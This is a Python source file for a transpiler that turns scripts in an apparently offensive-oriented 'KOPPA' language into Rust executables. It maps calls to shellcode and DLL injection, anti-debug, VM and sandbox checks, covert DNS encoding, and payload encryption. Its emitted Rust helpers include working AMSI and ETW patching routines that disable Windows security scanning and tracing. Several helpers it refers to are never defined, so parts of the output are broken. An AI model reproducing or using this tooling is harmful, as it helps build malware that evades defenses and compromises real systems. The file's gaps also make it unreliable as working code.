"""
KOPPA → Rust Transpiler
Converts KOPPA source (especially unsafe{} blocks) to a native Rust Cargo project.

Usage:
    koppa transpile script.kop               # Generate Rust project in ./unsafe_build/
    koppa transpile --release script.kop     # Generate + cargo build --release
    koppa transpile --run script.kop         # Generate + build + run
"""

from pathlib import Path
from parser import parse, ASTNode, ASTNodeType
from lexer import tokenize
import json
import os
import subprocess
import sys


# ── Rust crate mappings for KOPPA stdlib calls ──────────────────────────────

_CARGO_DEPS = {
    "inject":  ['[target.\'cfg(windows)\'.dependencies]\nwindows-sys = { version = "0.52", features = ["Win32_System_Threading","Win32_System_Memory","Win32_Foundation","Win32_System_Diagnostics_ToolHelp","Win32_System_LibraryLoader"] }'],
    "mem":     ['[target.\'cfg(windows)\'.dependencies]\nwindows-sys = { version = "0.52", features = ["Win32_System_Threading","Win32_System_Memory","Win32_Foundation","Win32_System_ProcessStatus"] }'],
    "evasion": ['[target.\'cfg(windows)\'.dependencies]\nwindows-sys = { version = "0.52", features = ["Win32_System_Threading","Win32_System_Diagnostics_Debug","Win32_Foundation","Win32_System_Memory"] }'],
    "covert":  [],
    "crypt":   ['aes = "0.8"\ncbc = { version = "0.1", features = ["std"] }\nsha2 = "0.10"\nhmac = "0.12"\nrand = "0.8"\nhex = "0.4"'],
    "hash":    ['sha2 = "0.10"\nmd5 = "0.10"'],
    "encode":  ['base64 = "0.21"'],
    "net":     [],
    "log":     [],
}

_MODULE_USES = {
    "inject":  ["#[cfg(windows)]\nuse windows_sys::Win32::System::Threading::*;\n#[cfg(windows)]\nuse windows_sys::Win32::System::Memory::*;\n#[cfg(windows)]\nuse windows_sys::Win32::Foundation::*;\n#[cfg(windows)]\nuse windows_sys::Win32::System::Diagnostics::ToolHelp::*;\n#[cfg(windows)]\nuse windows_sys::Win32::System::LibraryLoader::*;"],
    "mem":     ["#[cfg(windows)]\nuse windows_sys::Win32::System::Threading::*;\n#[cfg(windows)]\nuse windows_sys::Win32::System::Memory::*;\n#[cfg(windows)]\nuse windows_sys::Win32::Foundation::*;"],
    "evasion": ["#[cfg(windows)]\nuse windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;\n#[cfg(windows)]\nuse windows_sys::Win32::System::Memory::*;\n#[cfg(windows)]\nuse windows_sys::Win32::Foundation::*;"],
    "crypt":   ["use aes::Aes256;\nuse cbc::Encryptor;\nuse sha2::{Sha256, Digest};\nuse rand::Rng;"],
    "hash":    ["use sha2::{Sha256, Digest};\nuse md5::Md5;"],
    "encode":  ["use base64::{engine::general_purpose, Engine as _};"],
    "net":     ["use std::net::{TcpStream, UdpSocket};"],
    "log":     [],
    "covert":  ["use std::net::UdpSocket;\nuse std::time::Duration;"],
}


class RustTranspiler:
    def __init__(self):
        self.imports: set[str] = set()
        self.used_modules: set[str] = set()
        self.indent = 0
        self.output_lines: list[str] = []
        self.unsafe_mode = False

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _ind(self) -> str:
        return "    " * self.indent

    def _emit(self, line: str):
        self.output_lines.append(self._ind() + line)

    def _emit_raw(self, line: str):
        self.output_lines.append(line)

    # ── Top-level ────────────────────────────────────────────────────────────

    def transpile(self, source: str) -> dict:
        """Return {'main_rs': str, 'cargo_toml': str, 'used_modules': set}"""
        ast = parse(source)
        self.output_lines = []
        self.used_modules = set()
        self.imports = set()
        self.indent = 0

        # Scan imports
        for node in ast.children:
            if node.node_type == ASTNodeType.IMPORT:
                for name in (node.value or []):
                    self.used_modules.add(name)

        # Header
        self._emit_raw("#![allow(unused_variables, unused_mut, dead_code, non_snake_case)]")
        self._emit_raw("")
        for mod in sorted(self.used_modules):
            for use_line in _MODULE_USES.get(mod, []):
                self._emit_raw(use_line)
        self._emit_raw("")
        self._emit_raw("fn main() {")
        self.indent = 1

        for node in ast.children:
            if node.node_type == ASTNodeType.IMPORT:
                continue
            if node.node_type == ASTNodeType.FUNCTION and node.value == "main":
                body = node.meta.get("body")
                if body:
                    for stmt in (body.children if body else []):
                        self._transpile_node(stmt)
            elif node.node_type not in (ASTNodeType.FUNCTION, ASTNodeType.ASYNC_FUNCTION):
                self._transpile_node(node)

        self.indent = 0
        self._emit_raw("}")
        self._emit_raw("")

        # Emit non-main functions
        for node in ast.children:
            if node.node_type in (ASTNodeType.FUNCTION, ASTNodeType.ASYNC_FUNCTION) and node.value != "main":
                self._transpile_fn(node)

        main_rs = "\n".join(self.output_lines)
        cargo_toml = self._gen_cargo_toml()
        return {"main_rs": main_rs, "cargo_toml": cargo_toml, "used_modules": self.used_modules}

    def _gen_cargo_toml(self) -> str:
        base = '''[package]
name = "koppa-native"
version = "1.0.0"
edition = "2021"

[profile.release]
opt-level = 3
strip = true
lto = true

[dependencies]
'''
        deps_seen = set()
        dep_lines = []
        for mod in self.used_modules:
            for dep_block in _CARGO_DEPS.get(mod, []):
                if dep_block and dep_block not in deps_seen:
                    deps_seen.add(dep_block)
                    dep_lines.append(dep_block)

        return base + "\n".join(dep_lines)

    # ── Node dispatch ─────────────────────────────────────────────────────────

    def _transpile_node(self, node: ASTNode):
        t = node.node_type

        if t == ASTNodeType.VARIABLE:
            self._transpile_var(node)
        elif t == ASTNodeType.EXPRESSION_STMT:
            expr = self._transpile_expr(node.children[0])
            self._emit(f"{expr};")
        elif t == ASTNodeType.IF:
            self._transpile_if(node)
        elif t == ASTNodeType.FOR:
            self._transpile_for(node)
        elif t == ASTNodeType.WHILE:
            self._transpile_while(node)
        elif t == ASTNodeType.RETURN:
            if node.value:
                self._emit(f"return {self._transpile_expr(node.value)};")
            else:
                self._emit("return;")
        elif t == ASTNodeType.BLOCK:
            for child in node.children:
                self._transpile_node(child)
        elif t == ASTNodeType.UNSAFE_BLOCK:
            self._transpile_unsafe(node)
        elif t == ASTNodeType.TRY_CATCH:
            self._transpile_try(node)
        elif t == ASTNodeType.BREAK:
            self._emit("break;")
        elif t == ASTNodeType.CONTINUE:
            self._emit("continue;")
        else:
            expr = self._transpile_expr(node)
            if expr:
                self._emit(f"{expr};")

    def _transpile_fn(self, node: ASTNode):
        name = node.value or "unnamed"
        params = node.meta.get("params", [])
        param_str = ", ".join(f"{p['name']}: &str" for p in params)
        self._emit_raw(f"fn {name}({param_str}) {{")
        self.indent = 1
        body = node.meta.get("body")
        if body:
            for stmt in (body.children if body else []):
                self._transpile_node(stmt)
        self.indent = 0
        self._emit_raw("}")
        self._emit_raw("")

    def _transpile_var(self, node: ASTNode):
        name = node.value
        mutability = node.meta.get("mutability", "immutable")
        mut_kw = "mut " if mutability != "constant" else ""
        val = self._transpile_expr(node.children[0]) if node.children else "Default::default()"
        self._emit(f"let {mut_kw}{name} = {val};")

    def _transpile_if(self, node: ASTNode):
        cond = self._transpile_expr(node.value)
        self._emit(f"if {cond} {{")
        self.indent += 1
        self._transpile_node(node.children[0])
        self.indent -= 1

        for elif_cond, elif_block in node.meta.get("elif", []):
            self._emit_raw(self._ind() + "} else if " + self._transpile_expr(elif_cond) + " {")
            self.indent += 1
            self._transpile_node(elif_block)
            self.indent -= 1

        else_block = node.meta.get("else")
        if else_block:
            self._emit_raw(self._ind() + "} else {")
            self.indent += 1
            self._transpile_node(else_block)
            self.indent -= 1

        self._emit("}")

    def _transpile_for(self, node: ASTNode):
        var  = node.value
        iter_expr = self._transpile_expr(node.children[0])
        self._emit(f"for {var} in {iter_expr} {{")
        self.indent += 1
        self._transpile_node(node.children[1])
        self.indent -= 1
        self._emit("}")

    def _transpile_while(self, node: ASTNode):
        cond = self._transpile_expr(node.value)
        self._emit(f"while {cond} {{")
        self.indent += 1
        self._transpile_node(node.children[0])
        self.indent -= 1
        self._emit("}")

    def _transpile_unsafe(self, node: ASTNode):
        self._emit("unsafe {")
        self.indent += 1
        old = self.unsafe_mode
        self.unsafe_mode = True
        self._transpile_node(node.children[0])
        self.unsafe_mode = old
        self.indent -= 1
        self._emit("}")

    def _transpile_try(self, node: ASTNode):
        self._emit("// try block")
        self._emit("{")
        self.indent += 1
        self._transpile_node(node.value)
        self.indent -= 1
        self._emit("}")
        if node.children and node.children[0]:
            catch_var = node.meta.get("catch_var", "_err")
            self._emit(f"// catch ({catch_var})")

    # ── Expression transpiler ─────────────────────────────────────────────────

    def _transpile_expr(self, node: ASTNode) -> str:
        if node is None:
            return "None"
        t = node.node_type

        if t == ASTNodeType.LITERAL:
            return self._lit(node)

        if t == ASTNodeType.IDENTIFIER:
            name = node.value
            if name == "true":  return "true"
            if name == "false": return "false"
            if name == "null" or name == "None": return "None"
            return name

        if t == ASTNodeType.BINARY_OP:
            return self._bin_op(node)

        if t == ASTNodeType.UNARY_OP:
            op  = node.value
            val = self._transpile_expr(node.children[0])
            if op in ("!", "not"): return f"!{val}"
            if op == "-":          return f"-{val}"
            if op == "~":          return f"!{val}"
            return f"{op}{val}"

        if t == ASTNodeType.CALL:
            return self._call(node)

        if t == ASTNodeType.MEMBER_ACCESS:
            obj  = self._transpile_expr(node.children[0])
            memb = node.value
            return f"{obj}.{memb}"

        if t == ASTNodeType.ARRAY:
            elems = node.value if isinstance(node.value, list) else node.children
            inner = ", ".join(self._transpile_expr(e) for e in elems)
            return f"vec![{inner}]"

        if t == ASTNodeType.INDEX:
            arr = self._transpile_expr(node.children[0])
            idx = self._transpile_expr(node.value)
            return f"{arr}[{idx} as usize]"

        if t == ASTNodeType.DICT:
            pairs = []
            for pair in (node.value or []):
                k = pair.get("key", "")
                v = self._transpile_expr(pair.get("value"))
                pairs.append(f'("{k}".to_string(), {v})')
            return "vec![" + ", ".join(pairs) + "]"

        return "/* unsupported */"

    def _lit(self, node: ASTNode) -> str:
        val  = node.value
        kind = node.meta.get("type", "")
        if kind == "bytes":
            return f"b\"{val}\""
        if isinstance(val, bool):
            return "true" if val else "false"
        if isinstance(val, int):
            return str(val)
        if isinstance(val, float):
            return str(val) + "_f64"
        if isinstance(val, str):
            # Convert KOPPA {var} interpolation to Rust format! style
            import re
            rust_fmt = re.sub(r'\{(\w+)\}', r'{}', val)
            vars_used = re.findall(r'\{(\w+)\}', val)
            if vars_used:
                args = ", ".join(vars_used)
                return f'format!("{rust_fmt}", {args})'
            return f'"{val}".to_string()'
        return repr(val)

    def _bin_op(self, node: ASTNode) -> str:
        op   = node.value
        left = self._transpile_expr(node.children[0])
        right = self._transpile_expr(node.children[1])
        op_map = {
            "==": "==", "!=": "!=", "<": "<", ">": ">", "<=": "<=", ">=": ">=",
            "&&": "&&", "||": "||",
            "+": "+", "-": "-", "*": "*", "/": "/", "%": "%", "**": ".powf",
            "&": "&", "|": "|", "^": "^", "<<": "<<", ">>": ">>",
            "=": "=", "+=": "+=", "-=": "-=", "*=": "*=", "/=": "/=",
        }
        if op == "**":
            return f"{left}.powf({right} as f64)"
        if op in ("in",):
            return f"{right}.contains(&{left})"
        if op in ("not in",):
            return f"!{right}.contains(&{left})"
        rust_op = op_map.get(op, op)
        if op in ("=", "+=", "-=", "*=", "/="):
            return f"{left} {rust_op} {right}"
        return f"({left} {rust_op} {right})"

    def _call(self, node: ASTNode) -> str:
        func_node = node.value
        args = [self._transpile_expr(a) for a in node.children]

        # module.method() call
        if func_node.node_type == ASTNodeType.MEMBER_ACCESS:
            mod  = self._transpile_expr(func_node.children[0])
            meth = func_node.value
            return self._map_module_call(mod, meth, args)

        func = self._transpile_expr(func_node)

        # Built-in mappings
        builtins = {
            "print": lambda a: f'println!("{{}}", {", ".join(a)})',
            "str":   lambda a: f'{a[0]}.to_string()' if a else '"".to_string()',
            "int":   lambda a: f'{a[0]}.parse::<i64>().unwrap_or(0)' if a else '0i64',
            "float": lambda a: f'{a[0]}.parse::<f64>().unwrap_or(0.0)' if a else '0.0f64',
            "len":   lambda a: f'{a[0]}.len()' if a else '0',
            "range": lambda a: f'({a[0]}..{a[1]})' if len(a) >= 2 else f'(0..{a[0]})',
        }
        if func in builtins:
            return builtins[func](args)

        arg_str = ", ".join(args)
        return f"{func}({arg_str})"

    def _map_module_call(self, mod: str, meth: str, args: list[str]) -> str:
        a = args

        # ── log ──────────────────────────────────────────────────────────────
        if mod == "log":
            prefix = {"info": "INFO", "warn": "WARN", "error": "ERROR",
                      "debug": "DEBUG", "success": "SUCCESS"}.get(meth, meth.upper())
            val = a[0] if a else '""'
            return f'println!("[{prefix}] {{}}", {val})'

        # ── inject ────────────────────────────────────────────────────────────
        if mod == "inject":
            if meth == "find_pid":
                return f'koppa_find_pid({a[0] if a else "\"\""})'
            if meth == "shellcode":
                pid = a[0] if len(a) > 0 else "0"
                sc  = a[1] if len(a) > 1 else "&[]"
                return f'koppa_shellcode_inject({pid}, {sc})'
            if meth == "dll":
                pid  = a[0] if len(a) > 0 else "0"
                path = a[1] if len(a) > 1 else '""'
                return f'koppa_dll_inject({pid}, {path})'
            if meth == "list_procs":
                return "koppa_list_procs()"
            return f'/* inject.{meth} */ todo!()'

        # ── mem ───────────────────────────────────────────────────────────────
        if mod == "mem":
            if meth == "read":
                return f'koppa_mem_read({", ".join(a)})'
            if meth == "write":
                return f'koppa_mem_write({", ".join(a)})'
            if meth == "alloc":
                return f'koppa_mem_alloc({", ".join(a)})'
            if meth == "scan":
                return f'koppa_mem_scan({", ".join(a)})'
            return f'/* mem.{meth} */ todo!()'

        # ── evasion ───────────────────────────────────────────────────────────
        if mod == "evasion":
            if meth == "is_debugged":
                return "#[cfg(windows)] { unsafe { IsDebuggerPresent() != 0 } }"
            if meth == "is_vm":
                return "koppa_is_vm()"
            if meth == "is_sandbox":
                return "koppa_is_sandbox()"
            if meth == "patch_etw":
                return "koppa_patch_etw()"
            if meth == "patch_amsi":
                return "koppa_patch_amsi()"
            if meth == "sleep":
                secs = a[0] if a else "1"
                return f'std::thread::sleep(std::time::Duration::from_secs_f64({secs} as f64))'
            return f'/* evasion.{meth} */ false'

        # ── covert ────────────────────────────────────────────────────────────
        if mod == "covert":
            if meth == "dns_encode":
                return f'koppa_dns_encode({", ".join(a)})'
            if meth == "dns_decode":
                return f'koppa_dns_decode({a[0] if a else "\"\""})'
            if meth == "icmp_send":
                return f'koppa_icmp_send({", ".join(a)})'
            return f'/* covert.{meth} */ todo!()'

        # ── crypt ─────────────────────────────────────────────────────────────
        if mod == "crypt":
            if meth == "xor":
                return f'koppa_xor({", ".join(a)})'
            if meth == "rc4":
                return f'koppa_rc4({", ".join(a)})'
            if meth == "aes_encrypt":
                return f'koppa_aes_encrypt({", ".join(a)})'
            if meth == "aes_decrypt":
                return f'koppa_aes_decrypt({", ".join(a)})'
            if meth == "gen_key":
                bits = a[0] if a else "256"
                return f'{{ let mut k = vec![0u8; {bits}/8]; rand::thread_rng().fill(&mut k[..]); k }}'
            if meth == "gen_iv":
                return '{ let mut iv = [0u8; 16]; rand::thread_rng().fill(&mut iv); iv.to_vec() }'
            if meth == "hmac":
                return f'koppa_hmac({", ".join(a)})'
            return f'/* crypt.{meth} */ todo!()'

        # ── hash ─────────────────────────────────────────────────────────────
        if mod == "hash":
            if meth == "sha256":
                return f'{{ let mut h = Sha256::new(); h.update({a[0] if a else "b\"\""}); format!("{{:x}}", h.finalize()) }}'
            if meth == "md5":
                return f'{{ let mut h = Md5::new(); h.update({a[0] if a else "b\"\""}); format!("{{:x}}", h.finalize()) }}'
            return f'/* hash.{meth} */ String::new()'

        # ── encode ────────────────────────────────────────────────────────────
        if mod == "encode":
            if meth == "b64_encode":
                return f'general_purpose::STANDARD.encode({a[0] if a else "b\"\""})'
            if meth == "b64_decode":
                return f'general_purpose::STANDARD.decode({a[0] if a else "\"\""})'
            return f'/* encode.{meth} */ String::new()'

        # ── net ───────────────────────────────────────────────────────────────
        if mod == "net":
            if meth == "tcp_connect":
                host = a[0] if len(a) > 0 else '"127.0.0.1"'
                port = a[1] if len(a) > 1 else "80"
                return f'TcpStream::connect(format!("{{}}:{{}}", {host}, {port})).is_ok()'
            return f'/* net.{meth} */ false'

        arg_str = ", ".join(a)
        return f'{mod}_{meth}({arg_str})'


# ── Runtime helpers emitted into the Rust source ────────────────────────────

RUST_HELPERS = r'''
// ── KOPPA runtime helpers ─────────────────────────────────────────────────

fn koppa_xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    if key.is_empty() { return data.to_vec(); }
    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
}

fn koppa_rc4(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut s: Vec<u8> = (0u8..=255).collect();
    let mut j: u8 = 0;
    for i in 0..256usize {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }
    let mut i: u8 = 0; let mut j: u8 = 0;
    data.iter().map(|&b| {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        b ^ s[s[i as usize].wrapping_add(s[j as usize]) as usize]
    }).collect()
}

fn koppa_dns_encode(data: &str, domain: &str) -> String {
    use std::fmt::Write;
    let bytes = data.as_bytes();
    let mut encoded = String::new();
    // Base32-like hex encoding split into DNS labels
    for chunk in bytes.chunks(30) {
        let hex: String = chunk.iter().map(|b| format!("{:02x}", b)).collect();
        if !encoded.is_empty() { encoded.push('.'); }
        encoded.push_str(&hex);
    }
    format!("{}.{}", encoded, domain)
}

fn koppa_dns_decode(fqdn: &str, domain: &str) -> String {
    let stripped = fqdn.trim_end_matches(&format!(".{}", domain))
                       .trim_end_matches(domain);
    let hex: String = stripped.split('.').collect();
    let bytes: Vec<u8> = (0..hex.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&hex[i..i.min(hex.len()).max(i+2)], 16).ok())
        .collect();
    String::from_utf8_lossy(&bytes).to_string()
}

fn koppa_is_vm() -> bool {
    #[cfg(windows)] {
        // Check for VM registry artifacts
        std::path::Path::new(r"C:\windows\system32\vmtoolsd.exe").exists() ||
        std::path::Path::new(r"C:\windows\system32\vboxservice.exe").exists()
    }
    #[cfg(not(windows))] { false }
}

fn koppa_is_sandbox() -> bool {
    std::env::var("USERNAME").map(|u| {
        matches!(u.to_lowercase().as_str(), "sandbox"|"malware"|"virus"|"sample"|"test")
    }).unwrap_or(false)
}

#[cfg(windows)]
fn koppa_patch_etw() -> bool {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};
    use windows_sys::Win32::Foundation::BOOL;
    unsafe {
        let ntdll: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
        let hmod = GetModuleHandleW(ntdll.as_ptr());
        if hmod == 0 { return false; }
        let fn_name = b"NtTraceEvent\0";
        let addr = GetProcAddress(hmod, fn_name.as_ptr());
        if addr.is_none() { return false; }
        let ptr = addr.unwrap() as *mut u8;
        let mut old: u32 = 0;
        VirtualProtect(ptr as _, 1, PAGE_EXECUTE_READWRITE, &mut old);
        *ptr = 0xC3; // RET
        VirtualProtect(ptr as _, 1, old, &mut old);
        true
    }
}
#[cfg(not(windows))]
fn koppa_patch_etw() -> bool { false }

#[cfg(windows)]
fn koppa_patch_amsi() -> bool {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress, LoadLibraryW};
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};
    unsafe {
        let amsi: Vec<u16> = "amsi.dll\0".encode_utf16().collect();
        LoadLibraryW(amsi.as_ptr());
        let hmod = GetModuleHandleW(amsi.as_ptr());
        if hmod == 0 { return false; }
        let fn_name = b"AmsiScanBuffer\0";
        let addr = GetProcAddress(hmod, fn_name.as_ptr());
        if addr.is_none() { return false; }
        let ptr = addr.unwrap() as *mut u8;
        let mut old: u32 = 0;
        VirtualProtect(ptr as _, 3, PAGE_EXECUTE_READWRITE, &mut old);
        // xor eax, eax; ret
        *ptr = 0x31; *ptr.add(1) = 0xC0; *ptr.add(2) = 0xC3;
        VirtualProtect(ptr as _, 3, old, &mut old);
        true
    }
}
#[cfg(not(windows))]
fn koppa_patch_amsi() -> bool { false }

fn koppa_hmac(data: &str, key: &str) -> String {
    // Simple HMAC-SHA256 stub — install hmac + sha2 crates for full impl
    use sha2::{Sha256, Digest};
    let mut h = Sha256::new();
    h.update(key.as_bytes());
    h.update(data.as_bytes());
    format!("{:x}", h.finalize())
}
'''


# ── CLI entry ────────────────────────────────────────────────────────────────

def transpile_file(source_path: str, build_release: bool = False, run_after: bool = False) -> int:
    src_path = Path(source_path)
    if not src_path.exists():
        print(f"Error: {source_path} not found", file=sys.stderr)
        return 1

    source = src_path.read_text(encoding="utf-8")
    xp = RustTranspiler()

    try:
        result = xp.transpile(source)
    except Exception as e:
        print(f"Transpile error: {e}", file=sys.stderr)
        return 1

    # Output directory
    out_dir = Path("unsafe_build")
    src_dir = out_dir / "src"
    src_dir.mkdir(parents=True, exist_ok=True)

    # Write Cargo.toml
    (out_dir / "Cargo.toml").write_text(result["cargo_toml"], encoding="utf-8")

    # Write main.rs (insert helpers before closing brace)
    main_rs = result["main_rs"]
    # Append helpers at end of file
    main_rs = main_rs + "\n" + RUST_HELPERS

    (src_dir / "main.rs").write_text(main_rs, encoding="utf-8")

    mods = ", ".join(sorted(result["used_modules"])) or "none"
    print(f"\033[32m[transpile]\033[0m {src_path.name} → unsafe_build/")
    print(f"\033[34m[modules]\033[0m  {mods}")
    print(f"\033[34m[files]\033[0m    unsafe_build/Cargo.toml")
    print(f"\033[34m[files]\033[0m    unsafe_build/src/main.rs")

    if build_release or run_after:
        profile = "--release" if build_release else ""
        cmd = ["cargo", "build"] + ([profile] if profile else [])
        print(f"\033[33m[cargo]\033[0m    {' '.join(cmd)}")
        r = subprocess.run(cmd, cwd=str(out_dir))
        if r.returncode != 0:
            print("\033[31m[error]\033[0m cargo build failed", file=sys.stderr)
            return r.returncode

    if run_after:
        exe = out_dir / "target" / "debug" / "koppa-native"
        if sys.platform == "win32":
            exe = out_dir / "target" / "debug" / "koppa-native.exe"
        if exe.exists():
            subprocess.run([str(exe)])

    return 0
